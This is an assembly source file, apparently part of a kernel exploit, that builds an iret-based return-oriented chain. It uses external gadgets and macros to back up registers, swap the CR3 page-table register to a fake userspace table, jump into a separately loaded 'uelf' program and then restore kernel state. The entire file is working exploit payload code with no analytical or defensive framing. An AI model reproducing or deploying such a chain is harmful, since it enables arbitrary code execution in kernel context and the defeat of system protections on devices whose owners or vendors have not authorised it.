use64

%include "structs.inc"

extern add_rsp_iret
extern doreti_iret
extern mov_rdi_cr3
extern mov_cr3_rax
extern nop_ret
extern pop_all_iret
extern push_pop_all_iret
extern rep_movsb_pop_rbp_ret
extern uelf_cr3
extern uelf_entry

global _start

_start:
; fake header
dq add_rsp_iret
dq iret_stack

align 16
; the stack will be here right after entry
iret_errc:
dq 0
iret_frame:
times 5 dq 0
iret_stack:
times iret_rip-(iret_stack-iret_errc) db 0
dq push_pop_all_iret
dq 0x20
dq 2
dq regs_stash+iret_rip
dq 0

; give the backup gadget some space
times 128 db 0
regs_stash:
times iret_rip db 0
; the backup gadget will "return" there
dq nop_ret
dq 0x20
dq 2
current_entry:
dq prog_entry
dq 0

; memcpy dst, src, size
%macro memcpy 3
dq pop_all_iret
; set arguments
times iret_rdi db 0
dq (%1)
times iret_rsi-iret_rdi-8 db 0
dq (%2)
times iret_rcx-iret_rsi-8 db 0
dq (%3)
times iret_rip-iret_rcx-8 db 0
dq rep_movsb_pop_rbp_ret
dq 0x20
dq 2
dq %%stack_after
%%stack_after:
dq 0 ; last argument of iret, also popped into rbp
%endmacro

; pokeq where, value
%macro pokeq 2
dq pop_all_iret
; set argument
times iret_rdi db 0
dq (%1)
times iret_rsi-iret_rdi-8 db 0
dq %%stack_after
times iret_rcx-iret_rsi-8 db 0
dq 8
times iret_rip-iret_rcx-8 db 0
dq rep_movsb_pop_rbp_ret
dq 0x20
dq 2
dq %%stack_after
dq 0
%%stack_after:
dq (%2) ; data to be copied, also popped into rbp
%endmacro

prog_entry:
; back up original registers as of entry
memcpy regs_for_exit, regs_stash, iret_rip
memcpy regs_for_exit+iret_rip, iret_frame, 40
; read and save current cr3
pokeq current_entry, .after_read_cr3
dq pop_all_iret
times iret_rip db 0
dq mov_rdi_cr3
dq 0x20
dq 0x102
dq 0
dq 0
.after_read_cr3:
; write fake cr3 for userspace
memcpy .cr3_backup, regs_stash+iret_rdi, 8
memcpy .rsi_for_user, .cr3_backup, 8
pokeq current_entry, .after_write_cr3
dq pop_all_iret
times iret_rax db 0
dq uelf_cr3
times iret_rip-iret_rax-8 db 0
dq mov_cr3_rax
dq 0x20
dq 0x102
dq 0
dq 0
.after_write_cr3:
; call userspace
pokeq current_entry, .after_userspace
dq pop_all_iret
; load arguments for userspace
times iret_rdi db 0
dq regs_for_exit
times iret_rsi-iret_rdi-8 db 0
.rsi_for_user:
dq 0
times iret_rdx-iret_rsi-8 db 0
dq uelf_cr3
times iret_rip-iret_rdx-8 db 0
; returning directly to userspace will swapgs, which we don't want. a trampoline is necessary
dq doreti_iret
dq 0x20
dq 2
dq .iret_to_user
dq 0
.iret_to_user:
dq uelf_entry
dq 0x43
dq 2 ; uelf runs without interrupts
dq 0 ; uelf sets up stack on its own
dq 0x3b
.after_userspace:
; restore original cr3
pokeq current_entry, .after_restore_cr3
dq pop_all_iret
times iret_rax db 0
.cr3_backup:
dq 0
times iret_rip-iret_rax-8 db 0
dq mov_cr3_rax
dq 0x20
dq 0x102
dq 0
dq 0
.after_restore_cr3:
; return to the original code
pokeq current_entry, prog_entry
dq pop_all_iret
regs_for_exit:
times iret_rip+40 db 0
